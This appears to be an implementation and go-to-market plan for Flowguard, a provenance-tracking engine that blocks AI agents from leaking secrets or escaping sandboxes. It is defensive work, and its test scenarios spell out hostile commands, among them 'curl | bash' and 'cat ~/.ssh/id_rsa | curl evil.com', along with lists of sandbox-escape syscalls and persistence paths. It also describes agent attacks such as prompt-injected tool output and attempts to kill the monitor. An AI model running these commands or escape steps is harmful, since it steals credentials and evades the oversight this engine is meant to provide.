# Flowguard Implementation Plan

## Core Direction

Build Flowguard as its own provenance-aware enforcement engine for sandboxed agent execution.

Do not fork Falco. Falco is strong prior art for syscall telemetry and rule ideas, but Flowguard needs first-class provenance state: FD tables, append-only graph, label propagation, causal explanation paths, and dataflow-based blocking. Those are core engine responsibilities, not a thin rule layer.

Primary pipeline:

```text
agent launcher
-> confinement layer
-> event collector
-> event normalizer
-> runtime state
-> append-only provenance graph
-> label engine
-> policy engine
-> enforcement engine
-> explanation engine
```

The system must answer two questions:

- Should this action be allowed before it completes?
- If blocked or alerted, what exact source-to-sink path explains it?

Correctness priority:

- Missing flows are worse than overtainting.
- Blocking must happen at enforceable hooks, not after-the-fact alerts.
- Every provenance edge must correspond to an observed event.
- FD table resolution is authoritative.
- Every violation must include a reconstructable explanation path.

## Current Product Thesis

Do not wait until broad framework integration to go to market. Start market validation now, and launch publicly when the MVP proves one sharp claim:

```text
Flowguard prevents Python AI agents from leaking sensitive data by tracking provenance of values before network, tool, or subprocess egress.
```

The market is real but crowded. OWASP has a dedicated Agentic AI Top 10 and solution landscape, and Microsoft Agent Governance Toolkit is already positioning itself as broad runtime governance across frameworks. Flowguard must not compete as generic agent governance.

Flowguard's wedge is narrower:

```text
provenance-aware DLP for agent runtimes
```

The core product distinction:

```text
generic governance:
  Can this action run?

Flowguard:
  Did sensitive data flow into the action payload?
```

## MVP Evidence Path

Production-ready Flowguard needs two layers working together:

```text
Python dynamic taint runtime = precise dataflow decisions
Sandbox / syscall enforcement = containment when Python precision is bypassed
```

Do not rely on Python monkey-patching alone for production. Use it for precision. Use sandboxing and syscall-level enforcement for containment boundaries.

The next end-to-end MVP story:

```text
OpenAI-style agent/tool
-> model-generated Python code attempts to read a secret
-> generated code transforms the secret
-> generated code tries HTTP exfiltration
-> Flowguard blocks before network egress
-> report explains the exact source-to-sink path
```

This is the product story users and investors can understand.

## Go-To-Market Plan

### 1. Build the Working PoC First

Do not make private outreach a prerequisite at this stage. The first priority is a working artifact that can be evaluated without a meeting.

Actions:

- build a short README section: "Stop AI agents from leaking secrets"
- ship three reproducible demos: blocked secret exfiltration, allowed safe telemetry, blocked subprocess escape
- make the PoC runnable by a new user in under 10 minutes
- produce JSON/JSONL reports that make the value inspectable without a live explanation
- optionally show the demo to a small number of reachable technical reviewers, but do not block progress on this

Success signal:

- a new user can reproduce the PoC from the README
- the blocked and allowed cases are obvious from the report
- external readers ask whether Flowguard supports their framework or deployment shape

### 2. Credible Public MVP

Before public launch, make the MVP reproducible and reviewable.

Required artifacts:

- one-command demo
- OpenAI Agents SDK example
- LangGraph or LangChain example
- JSON and JSONL report with source-to-sink explanation
- clear threat model and known limitations
- benchmark page covering secret read plus HTTP send, transformed secret leak, unrelated safe send, subprocess leak, and generated-code leak

Important claim discipline:

- do not claim full sandbox security
- claim precise tracked-data leak prevention inside the supported Python runtime
- claim conservative process/syscall fallback outside the precise runtime

### 3. Public Launch Trigger

Launch publicly when a new user can install and reproduce the PoC in under 10 minutes, and when Flowguard blocks a real-looking agent leak before network egress.

Launch channels:

- GitHub
- Hacker News
- Reddit
- X / LinkedIn
- OWASP GenAI community
- AI security Discords and Slacks
- LangChain and OpenAI Agents communities
- security newsletters

Launch message:

```text
Show HN: Flowguard - provenance-aware DLP for AI agents
```

### 4. Convert Attention Into Pilots

Offer:

```text
Bring your agent. We show whether it leaks secrets.
```

Target teams with agents that touch:

- customer data
- source code repositories
- cloud credentials
- support tickets
- financial documents
- health documents
- legal documents
- internal APIs

Commercial beta package:

- runtime SDK
- policy config
- report export
- dashboard or SIEM integration
- deployment support
- enterprise policy packs
- fleet management

Open-source the core runtime enough to build trust. Monetize hosted observability, enterprise policy management, compliance reporting, managed integrations, and support.

## Market Gate

Market validation starts before broad framework and product integration.

The gate is not feature count. The gate is repeated user pull.

Before expanding into a broad product phase, Flowguard needs:

- public PoC that a new user can reproduce in under 10 minutes
- 5 external users who run or meaningfully review the PoC
- 2 users who ask whether it can run on their own agent or workflow
- 1 user who asks for pilot-level support or deeper integration help
- repeated demand for the same painful use case after public promotion

If those signals are missing, do not keep adding features blindly. Narrow the ICP, improve the demo, and keep learning.

Best initial positioning:

- ICP: AI engineering and security teams deploying internal Python agents with access to secrets, repositories, tickets, or customer data
- Buyer: security or platform lead worried about agent data leakage and auditability
- Product: agent DLP runtime with provenance reports

Market references:

- Microsoft Agent Governance Toolkit announcement: https://opensource.microsoft.com/blog/2026/04/02/introducing-the-agent-governance-toolkit-open-source-runtime-security-for-ai-agents/
- Microsoft Agent Governance Toolkit limitations: https://github.com/microsoft/agent-governance-toolkit/blob/main/docs/LIMITATIONS.md
- OWASP Agentic AI Top 10 for 2026: https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/
- OWASP AI Security Solutions Landscape for Agentic AI Q2 2026: https://genai.owasp.org/resource/ai-security-solutions-landscape-for-agentic-ai-q2-2026/

## Production Roadmap

Status key:

- `[DONE]`: implemented and covered by tests or demos in the repo/branch
- `[WIP]`: partially implemented or currently under active development
- `[TODO]`: not implemented yet

Current status date: 2026-07-23.

### 1. [WIP] Finish MVP Evidence Path

- `[DONE]` merge the generated-code executor PR. The Python generated-code executor is merged.
- `[DONE]` add `FlowguardRuntime.report()` and JSON/JSONL export. `flowguard.report.v1` exists, with tests and demo output.
- `[DONE]` make supported Python HTTP blocks include source, tracked transformations, sink, policy, code hash, and event sequence in reports.
- `[DONE]` add first-pass precision-gap reporting for generated-code `json.dumps`, `str`, and `bytes` boundaries.
- `[DONE]` make the generated-code demo write reviewable JSON/JSONL artifacts under `logs/`.
- `[DONE]` package the generated-code leak, safe telemetry, and precision-loss cases as one-command public PoC output.
- `[DONE]` add optional live OpenAI Agents SDK demo where an LLM-backed agent calls a Flowguard generated-code tool and `SecretToNetwork` blocks before HTTP transport. The public runner uses Docker by default.

### 2. [WIP] Harden Python Dynamic Taint

- `[WIP]` expand `TrackedStr` and `TrackedBytes` propagation coverage. Basic string/bytes operations and generated-code f-string support exist.
- `[DONE]` add transform provenance to `TrackedStr` and `TrackedBytes` so reports show operations such as `str.replace`, `str.lower`, and `str.encode`.
- `[WIP]` add tests for `json`, `base64`, `urllib`, `requests`, `httpx`, containers, f-strings, slicing, joins, and formatting. Current tests cover f-strings, direct HTTP, `urllib`, fake `requests`, recursive containers, transform paths, base64 encoding, and subprocess blocking; `httpx` and broader container propagation remain incomplete.
- `[DONE]` add explicit `taint_precision_lost` events for the first known lossy generated-code boundaries.
- `[WIP]` add explicit unsupported-operation semantics: block, warn, or conservative fallback. `precision_mode="warn" | "strict"` exists for first-pass precision loss; raw sockets/native extensions need clearer coverage.
- `[WIP]` add wrappers or instrumentation for common provenance-losing library conversions. Generated-code `json.dumps`, `str`, `bytes`, and common `base64` encoders are covered; `urllib.parse.urlencode` and related pre-egress encoders remain.
- `[TODO]` add overhead benchmarks.

### 3. [WIP] Harden Generated-Code Execution

- `[DONE]` treat `run_python(code)` as the only supported generated-code path.
- `[DONE]` keep AST preflight, restricted imports, code hash, and `runtime.protect()`.
- `[TODO]` add timeouts, memory limits, output limits, and execution IDs.
- `[DONE]` store code hash by default and avoid exporting full generated-code bodies.

### 4. [TODO] Add Sandbox Worker Model

- `[TODO]` run each agent or generated-code execution in an isolated worker process or container.
- `[TODO]` avoid shared global monkey-patching across unrelated tasks.
- `[TODO]` use read-only filesystem mounts by default.
- `[TODO]` make secret mounts explicit and labeled.
- `[TODO]` disable or broker network by default.
- `[WIP]` block subprocesses unless brokered. Python `protect()` blocks common `subprocess` APIs; worker-level enforcement is not implemented.

### 5. [WIP] Add Egress Broker

- `[WIP]` route HTTP and socket egress through Flowguard. Guarded HTTP and protected `urllib`/loaded `requests`/loaded `httpx` paths exist; raw socket coverage is not complete.
- `[DONE]` run policy checks before supported HTTP sends.
- `[TODO]` support destination allowlists.
- `[DONE]` block `SECRET -> external network` for supported HTTP sinks.
- `[DONE]` log allowed and blocked supported HTTP egress with provenance through `FlowguardRuntime.report()`.

### 6. [TODO] Fuse Python Runtime With Rust Core

- `[TODO]` feed Python runtime events into the Rust provenance engine.
- `[TODO]` produce one combined report: object-level taint path plus process/syscall fallback path.
- `[TODO]` when Python precision is unavailable, let Rust syscall provenance report conservative `secret read -> network` evidence.

### 7. [WIP] Expand Framework Coverage

- `[DONE]` OpenAI Agents SDK first. Adapter skeleton, protected-tool demo, and optional live LLM-backed generated-code demo exist.
- `[TODO]` LangGraph / LangChain second.
- `[TODO]` MCP gateway and tool-server boundary third.
- `[DONE]` do not chase every framework until the runtime and report contract is stable.

### 8. [TODO] Add Policy System

Policy files cover:

- `[TODO]` secret sources
- `[TODO]` allowed endpoints
- `[TODO]` declassification rules
- `[TODO]` blocked imports
- `[TODO]` subprocess broker rules

Policy behavior:

- `[WIP]` default-deny dangerous sinks. Some dangerous paths are blocked in code, but not via policy files.
- `[WIP]` explicit declassification only. Declassification exists in the Rust-side design; Python value-level policy/config work remains.
- `[DONE]` never clear taint implicitly.

### 9. [WIP] Add Bypass Testing

Regression cases:

- `[WIP]` `__import__`, `eval`, and `exec`. Generated-code policy rejects direct dunder import; more bypass cases remain.
- `[WIP]` `ctypes` and native extensions. `ctypes` import is blocked by AST policy; native extension behavior needs explicit tests.
- `[WIP]` subprocess exfiltration. `protect()` blocks common subprocess APIs; end-to-end exfiltration case needs public PoC coverage.
- `[TODO]` raw sockets.
- `[WIP]` encoding and base64 transformation. Encoding paths and base64 propagation tests exist; broader encoder coverage remains.
- `[TODO]` temporary files.
- `[TODO]` prompt-injected generated code.
- `[WIP]` framework tool misuse. OpenAI protected-tool and live generated-code demos exist; broader framework coverage remains.

Known unsupported paths must block, broker, warn, or fall back conservatively. They must not silently allow egress while claiming precise provenance.

### 10. [TODO] Build Operational Product Layer

CLI shape:

```text
flowguard python run ...
flowguard agent run ...
flowguard report ...
```

Product requirements:

- `[WIP]` stable logs and report schema. `flowguard.report.v1` exists; schema needs review before being treated as stable.
- `[TODO]` OpenTelemetry or SIEM export later.
- `[TODO]` clear install path.
- `[WIP]` demos and README commands. Python taint demos live under `runtimes/python-taint/demos`; system provenance POCs live under `crates/system-provenance/scripts`.
- `[TODO]` performance budget.
- `[TODO]` benchmark suite.

### 11. [DONE] Repository Layout

- `[DONE]` move the precise Python dynamic taint runtime to `runtimes/python-taint/`.
- `[DONE]` move Python demos and scripts under `runtimes/python-taint/demos/` and `runtimes/python-taint/scripts/`.
- `[DONE]` move Rust syscall/process provenance code to `crates/system-provenance/`.
- `[DONE]` move system provenance scenarios, fixtures, Docker observer assets, and scripts under `crates/system-provenance/`.
- `[DONE]` keep a root Cargo workspace so `cargo test` remains valid from the repository root.

## Related Systems

Use these systems as reference points, not as architecture templates.

- Falco: mature syscall detection and rule taxonomy. Useful for event fields, suspicious behavior examples, and alert outputs. Not enough for provenance-first blocking.
- Tetragon: useful reference for eBPF-based runtime visibility and enforcement. Especially relevant for return-value override versus signal-based termination.
- KubeArmor: useful reference for LSM-backed policy enforcement over processes, files, and network behavior.
- Tracee: useful reference for eBPF event collection and security detections.
- AppArmor, SELinux, Landlock, seccomp: practical confinement and syscall/file-access control layers.
- gVisor and Firecracker: stronger sandbox substrates underneath Flowguard, not replacements for provenance.
- CamFlow, SPADE, PASS: provenance systems worth studying for graph collection, storage, and querying.
- AgentSentinel: closest agent-specific reference. Useful for computer-use-agent threat modeling, task-context-aware auditing, sensitive-operation suspension, and the BadComputerUse benchmark taxonomy. Flowguard should not copy its LLM-auditor-first design as the core decision path.

Design stance:

- Borrow telemetry ideas from Falco and Tracee.
- Borrow enforcement ideas from Tetragon, KubeArmor, Landlock, seccomp, and BPF-LSM.
- Borrow agent/task-context ideas and benchmark categories from AgentSentinel.
- Keep Flowguard's graph, labels, policy decisions, and explanations as our own Rust core.

## Flowguard Differentiation

Compared with AgentSentinel, Flowguard should be provenance-first rather than audit-first.

AgentSentinel is valuable because it protects computer-use agents in real time, suspends sensitive operations, and combines task context with system traces. The weakness for Flowguard's target is that an LLM-based auditor is still a nondeterministic decision component, and trace/task text can become part of the attack surface.

Flowguard's improvement path:

- deterministic core decisions from typed events, FD tables, provenance graph edges, labels, and explicit policy rules
- reconstructable source-to-sink explanations for every violation
- process identity based on PID plus start time, with full descendant tracking from the agent root
- structured traces that treat command strings, paths, and file contents as metadata, not trusted policy instructions
- approval and cache entries scoped by task id, process identity, sink object, policy id, label state, timestamp, and TTL
- scenario-first regression tests for every policy and bug fix
- optional LLM auditor only as a secondary triage layer, never as the only blocker for known dataflow policies

This makes Flowguard stronger for high-confidence rules such as `SECRET -> SEND`, `EXTERNAL -> EXEC`, and sandbox escape primitives. LLM review can still help for ambiguous cases, but the MVP must demonstrate deterministic blocking without it.

## Enforcement Model

Flowguard needs three enforcement planes.

### Static Confinement

Applied at agent launch before any provenance is known.

Block or restrict:

- namespace and mount changes: `setns`, `unshare`, `mount`, `pivot_root`, `chroot`
- privilege changes: `setuid`, `setgid`, `capset`, suspicious `prctl`
- process inspection/control: `ptrace`, dangerous `/proc/*` access
- kernel attack surface: `bpf`, `perf_event_open`, module loading
- host escape surfaces: `/var/run/docker.sock`, containerd sockets, host namespace handles, `/sys`, risky `/dev`

Possible mechanisms:

- seccomp filters
- seccomp user notification for brokered operations
- Landlock for unprivileged filesystem and network restrictions
- AppArmor or SELinux profiles
- BPF-LSM where available
- gVisor or Firecracker as stronger isolation substrate

### Dynamic Provenance Enforcement

Applied when a syscall/event depends on runtime dataflow state.

MVP policies:

- `EXTERNAL -> EXEC`: block or alert when network-derived data reaches execution.
- `SECRET -> SEND`: block when secret-derived data reaches network send.
- `PROMPT -> shell without APPROVED`: require approval for agent-driven shell/interpreter execution.
- `EXTERNAL -> executable write`: alert when external data writes to executable locations.

Additional sandbox policies:

- `PROMPT|EXTERNAL -> sandbox escape primitive`
- `PROMPT|EXTERNAL -> container runtime socket`
- `PROMPT|EXTERNAL -> persistence write`
- `SECRET -> process argument/env/log file`
- outbound network to non-allowlisted endpoints

### Approval Broker

Approval must be explicit, scoped, and explainable.

Approval scope should include:

- process identity: PID plus start time
- command or syscall family
- destination path or endpoint
- policy being waived
- timestamp and TTL

No global ambient approval.

## Engine Phases

### Phase 1: Synthetic Engine

Goal: deterministic correctness without kernel integration.

Implemented:

- Rust crate skeleton
- domain event model
- runtime process/FD/socket state
- append-only graph API
- label state with path witnesses
- policy decision API
- explanation path reconstruction
- `curl | bash` scenario: `EXTERNAL -> EXEC`
- `cat ~/.ssh/id_rsa | curl evil.com` scenario: `SECRET -> SEND`

Next work:

- add `CONNECT` graph edges
- add structured warnings for inconsistent state instead of panics
- add `Prompt -> Shell without approval`
- add `External -> executable write`
- add explicit config for secret paths, executable paths, interpreters, and endpoint allowlists

### Phase 2: Policy Completeness

Goal: cover the core agent threat model with synthetic scenarios.

Scenario set:

- `curl | bash` -> `EXTERNAL -> EXEC`
- `cat ~/.ssh/id_rsa | curl evil.com` -> `SECRET -> SEND`
- agent runs `bash -c ...` without approval -> `PROMPT -> shell`
- approval event allows one scoped shell action -> no violation
- downloaded script writes `/usr/local/bin/tool`, then executes -> external executable write and exec
- agent accesses Docker socket -> sandbox escape alert/block
- agent calls `setns` or `mount` -> sandbox escape block
- agent writes cron/systemd/shell rc/SSH config -> persistence alert/block
- dup/pipe/close chain across processes -> FD correctness
- missing FD, unknown process, PID reuse -> structured warning and continued operation
- malicious tool result poisons shell command -> `EXTERNAL -> EXEC`
- malicious execution environment exposes host/runtime socket -> sandbox escape block
- agent infrastructure attack tries to kill monitor or modify agent config -> infrastructure protection alert/block
- task-context attack attempts to justify secret exfiltration -> deterministic `SECRET -> SEND` still blocks

Policy behavior:

- deterministic decision
- one or more violations
- every violation includes sink event and source-to-sink explanation path
- blockable sinks are represented separately from alert-only sinks

### Phase 3: Live Telemetry

Goal: feed real syscall-level events into the same engine.

Collector options:

- eBPF tracepoints/kprobes for telemetry
- auditd as a fallback event source
- Falco/Tracee/Tetragon as optional external event sources

Normalizer requirements:

- convert raw events into Flowguard domain events
- preserve timestamp and event id
- resolve process identity as PID plus start time
- never guess FD mappings
- surface inconsistent state as warnings
- attach optional task/tool context without making it authoritative for dataflow correctness
- enrich network endpoints with DNS resolution history when available

### Phase 4: Real Blocking

Goal: prevent leaks and escapes in live agent sandboxes.

Start narrow:

- block `execve` for `EXTERNAL -> EXEC`
- block `sendmsg`/`sendto`/`write` to socket for `SECRET -> NETWORK`
- block `openat/openat2` for sensitive host paths
- block `mount`, `setns`, `unshare`, `ptrace`, `bpf`, `capset`
- block writes to persistence and executable locations

Mechanism order:

- use static seccomp/Landlock/AppArmor constraints first
- use seccomp user notification for brokered decisions where feasible
- use BPF-LSM for lower-level blocking where available
- use eBPF telemetry for observation and explanation, not as the only blocking layer

## Agent Context Model

Flowguard should add an optional context stream beside syscall events.

Context events:

- `TaskStart`: task id, user-visible task text hash, agent root process
- `ToolUseStart`: task id, tool id, process identity, command/argv metadata
- `ToolUseEnd`: task id, tool id, process identity, exit status
- `AgentMessage`: task id, message hash and direction, not full prompt text by default
- `ApprovalGranted`: scoped approval for one policy/action/sink

Rules:

- context can narrow explanations and approval scope
- context cannot create provenance edges by itself
- context cannot override deterministic blocks such as `SECRET -> SEND`
- full task text should be optional and treated as untrusted metadata

## Precision Track: DynamoRIO Tainted-Buffer POC

Goal: evaluate whether dynamic binary instrumentation can give Flowguard a higher-precision signal for `SECRET -> network` without becoming language-specific.

This is not the primary MVP enforcement path. The primary MVP remains syscall provenance plus runtime blocking. The DynamoRIO work is a precision experiment that should produce additional evidence for byte-derived leaks.

### Task

Build a minimal DynamoRIO client that tracks secret-derived bytes from file reads to network sends for one Linux process tree.

Initial target:

```text
drrun -c flowguard_dbi_client.so -- python3 crates/system-provenance/fixtures/agents/python_secret_post.py
```

The client should:

- observe `open/openat` and identify configured secret paths
- observe successful `read` from a secret fd and mark the returned user buffer as `SECRET`
- instrument memory/register data movement enough to propagate `SECRET` through direct copies and common libc copy paths
- observe `send/sendto/sendmsg/write` to socket fds
- report `DefiniteSecretToNetwork` if the send buffer overlaps tainted bytes
- emit a normalized Flowguard event/report that can be correlated with the syscall provenance graph

### Scope

MVP scope:

- Linux container target only
- x86_64 first, AArch64 only after the first POC works
- one traced process plus direct child processes if DynamoRIO client inheritance is practical
- Python demo first, but no Python-specific hooks
- direct byte copy propagation first
- block by aborting/killing the process or returning a failing syscall if practical

Non-goals:

- full language-level semantics
- complete implicit-flow tracking
- cryptographic/semantic leakage detection
- high performance
- production hardening
- replacing FD-table-based syscall provenance

### Architecture

Keep the DBI component outside the Rust core initially.

Proposed layout:

```text
dbi/dynamorio-client/
  CMakeLists.txt
  src/client.cpp
  README.md

src/events/
  add optional high-confidence event kind later:
  DefiniteTaintedSend { process, fd, endpoint, taint_source, byte_count, at }
```

Flowguard integration should be one-way at first:

```text
DynamoRIO client JSONL
-> Flowguard import/replay
-> correlate with syscall graph by pid/start-time/fd/event time
```

Do not let the DBI client mutate the provenance graph directly. Every graph edge still comes from an observed event in the normal engine.

### Acceptance Criteria

The POC is useful only if it proves all of these:

- A Python script that reads `crates/system-provenance/fixtures/home/.ssh/id_rsa` and sends the same bytes is reported as `DefiniteSecretToNetwork`.
- A Python script that reads the same secret but sends unrelated constant text does not produce the high-confidence DBI violation.
- The normal syscall provenance layer still reports the conservative `PossibleSecretToNetwork` case.
- The report includes secret source path, sink fd/endpoint when available, tainted byte count, process identity, and event timestamp.
- The test runs in Docker with one command and writes artifacts under `logs/`.

### Risks

- Dynamic binary instrumentation may be too slow for normal agent execution.
- Correct taint propagation across all instructions and optimized libc paths is a large project.
- JIT runtimes, native extensions, shared memory, mmap, and multi-process handoff can create blind spots.
- The DBI result should be treated as high-confidence when present, not as the only security boundary.

## Benchmark Strategy

The MVP should not start by integrating a large external benchmark. First prove Flowguard's core claim with small deterministic scenarios, then map selected external benchmark cases into Flowguard scenario files.

Benchmark order:

1. Flowguard-owned scenario suite
2. BadComputerUse-derived security slice
3. AgentDojo prompt-injection and exfiltration cases
4. AgentHazard long-horizon harmful-behavior cases
5. OSWorld benign regression subset

### Flowguard-Owned Scenarios

These are the acceptance tests for the engine itself.

Required MVP cases:

- `SECRET -> SEND`: fake SSH key or `.env` data reaches network send
- `EXTERNAL -> EXEC`: downloaded or received data reaches shell/script execution
- `PROMPT -> shell without APPROVED`: agent launches interpreter without scoped approval
- sandbox escape primitive: Docker socket, namespace switch, mount, ptrace, or BPF attempt
- Copy Fail-style boundary abuse: unusual kernel boundary event such as `AF_ALG`
- benign network send: public file or generated text reaches allowed endpoint
- benign shell with approval: scoped approval suppresses only the intended shell policy

Metrics:

- policy id is deterministic
- sink event is shown
- source-to-sink explanation path is reconstructable
- block happens at the sink that would complete the unsafe operation
- paired benign scenario is allowed

### BadComputerUse-Derived Slice

BadComputerUse is useful for comparing against AgentSentinel, but it should be sampled rather than fully integrated for MVP.

Convert 5-10 representative cases into `crates/system-provenance/scenarios/*.yaml`:

- malicious tool result causes `curl | bash`
- agent reads `.ssh/id_rsa` and exfiltrates it
- agent reads `.env` or API key material and sends it externally
- malicious execution environment exposes a runtime socket
- agent infrastructure attack tries to kill or modify the monitor
- task-context attack attempts to justify secret exfiltration
- benign equivalent for each high-risk behavior where possible

Flowguard result should report:

- block/allow decision
- policy id
- sink event
- explanation path
- whether task/tool context was present but non-authoritative

### AgentDojo

AgentDojo is better for indirect prompt injection and malicious tool-output scenarios. Use it after the Flowguard-owned and BadComputerUse-derived cases pass.

Good candidates:

- untrusted email/document/web result asks agent to leak private data
- tool result changes intended command
- external observation causes unsafe file or network action

Flowguard value:

- the model may be tricked, but `SECRET -> SEND` and `EXTERNAL -> EXEC` still block from provenance state

### AgentHazard

AgentHazard is useful later for long-horizon composition where individual actions look locally acceptable. It is too large for the first MVP.

Use after task/tool context exists:

- multi-turn secret collection then exfiltration
- repeated benign-looking writes that create persistence
- accumulated context that leads to sandbox escape

### OSWorld

OSWorld is not a security benchmark, but it is useful for false-positive checks after live or live-ish integration.

Use a small benign subset to ensure Flowguard does not block normal desktop/agent workflows unless a policy-relevant dataflow occurs.

## Module Ownership

- `events`: observed domain events only
- `state`: process table, FD table, socket mappings, object resolution
- `graph`: append-only node and edge storage
- `labels`: seed labels, propagation rules, witness paths
- `policy`: deterministic rules and decisions
- `explain`: source-to-sink explanation reconstruction
- `enforce`: allow/alert/approval/block outcomes
- `scenarios`: deterministic event replay and scenario tests

Keep these responsibilities separate. `scenarios` may orchestrate but must not own business logic.

## Immediate Next Steps

1. `[DONE]` Finish and merge the generated-code executor work.
2. `[DONE]` Add Python runtime report/export support: `FlowguardRuntime.report()`, JSON, and JSONL.
3. `[DONE]` Update the generated-code demo so blocked and allowed cases write reviewable artifacts under `logs/`.
4. `[DONE]` Add transform provenance to reports for supported tracked operations.
5. `[DONE]` Add recursive payload report tests proving nested tainted values block and export sources/transforms.
6. `[DONE]` Add `taint_precision_lost` events and define warn-vs-strict behavior.
7. `[DONE]` Create one-command public PoC for transformed secret exfiltration, safe telemetry, and strict precision-loss blocking.
8. `[DONE]` Update `README.md` with the PoC command, expected terminal output, report paths, and known limitations.
9. `[WIP]` Add wrappers or AST instrumentation for common provenance-losing library conversions. Generated-code `json.dumps`, `str`, and `bytes` are covered; broader encoders remain.
10. `[WIP]` Add OpenAI Agents SDK and LangGraph/LangChain demo coverage against the same report contract. OpenAI protected-tool and live generated-code demos exist; LangGraph/LangChain coverage remains.
11. `[WIP]` Add unsupported-path tests for subprocess, raw socket, unsafe imports, and native escape attempts. Subprocess and unsafe import coverage exists; raw socket/native escape coverage remains.
12. `[DONE]` Restructure repository ownership around `runtimes/python-taint` and `crates/system-provenance`.
13. `[TODO]` Promote the PoC once it is reproducible and record feedback in `docs/market-positioning.md`.

## Syscall Engine Backlog

These items remain important for the conservative fallback layer, but they are not the shortest path to a marketable MVP:

1. Add `CONNECT` edge creation and tests.
2. Add the MVP Flowguard-owned benchmark scenarios as replay YAML files.
3. Add task/tool context events to the scenario format without affecting provenance correctness.
4. Add `Prompt -> Shell without approval` scenario and policy.
5. Convert 5-10 BadComputerUse-derived cases into Flowguard scenario YAML.
6. Replace replay panics with structured warnings while keeping tests strict.
7. Add config object for secret paths, interpreters, executable locations, blocked paths, and network allowlists.
8. Update `docs/design.md` to match this prevention-first architecture and AgentSentinel comparison.

## MVP Demo Plan

Goal: demonstrate Flowguard blocking an agent or application that tries to leak sensitive data over the network.

The demo should make the core value obvious:

- without Flowguard, the agent would send the secret
- with Flowguard, the `SEND` sink is blocked
- the block includes a reconstructable explanation path

### Demo Scenario

Use a controlled malicious-agent fixture.

Behavior:

- read fake secret file: `crates/system-provenance/fixtures/home/.ssh/id_rsa`
- pass contents through a pipe or subprocess boundary
- send data to `evil.example:443`

Expected Flowguard decision:

```text
BLOCK SecretToNetwork
```

Expected explanation:

```text
file:/home/user/.ssh/id_rsa --READ--> proc:cat
proc:cat --WRITE--> pipe:2
pipe:2 --READ--> proc:curl
proc:curl --SEND--> endpoint:evil.example:443
```

### Replayable Scenario Files

Add scenario files under `crates/system-provenance/scenarios/`.

First scenario:

```text
crates/system-provenance/scenarios/secret_exfil.yaml
```

It should encode ordered observed events:

- `AgentLaunch`
- `Pipe`
- `Fork`
- `Dup`
- `Open`
- `Read`
- `Write`
- `Read`
- `Connect`
- `Send`

Reason: scenario files make demos easier to inspect, modify, and explain than hard-coded Rust fixtures.

### CLI Demo

Add a CLI binary:

```text
cargo run --manifest-path crates/system-provenance/Cargo.toml -- replay crates/system-provenance/scenarios/secret_exfil.yaml
```

Minimum output:

```text
BLOCK SecretToNetwork

sink:
  SEND proc:curl -> endpoint:evil.example:443

why:
  file:/home/user/.ssh/id_rsa --READ--> proc:cat
  proc:cat --WRITE--> pipe:2
  pipe:2 --READ--> proc:curl
  proc:curl --SEND--> endpoint:evil.example:443
```

CLI requirements:

- parse scenario file
- replay through existing engine
- print decision
- print sink event
- print explanation path
- exit nonzero on `Block`

### Allow/Block Comparison

Add two demo modes:

```text
cargo run --manifest-path crates/system-provenance/Cargo.toml -- replay crates/system-provenance/scenarios/secret_exfil.yaml --mode observe
cargo run --manifest-path crates/system-provenance/Cargo.toml -- replay crates/system-provenance/scenarios/secret_exfil.yaml --mode enforce
```

Expected behavior:

- `observe`: reports that `SECRET -> NETWORK` would be blocked
- `enforce`: marks the `SEND` event as blocked

This demonstrates the difference between passive detection and prevention.

### Live-ish Wrapper

After replay CLI works, add a small controlled wrapper:

```text
cargo run --manifest-path crates/system-provenance/Cargo.toml -- demo secret-exfil
```

The wrapper can launch a demo process or simulate wrapper-emitted events. It does not need eBPF yet.

Purpose:

- make the demo feel closer to a real agent
- keep Phase 1 deterministic
- avoid kernel integration before provenance and explanation are stable

### MVP Acceptance Criteria

- `cargo test` passes
- `cargo run --manifest-path crates/system-provenance/Cargo.toml -- replay crates/system-provenance/scenarios/secret_exfil.yaml` prints a block
- output includes policy name, sink event, and full source-to-sink path
- a benign scenario that sends non-secret data is allowed
- demo can be explained in under one minute
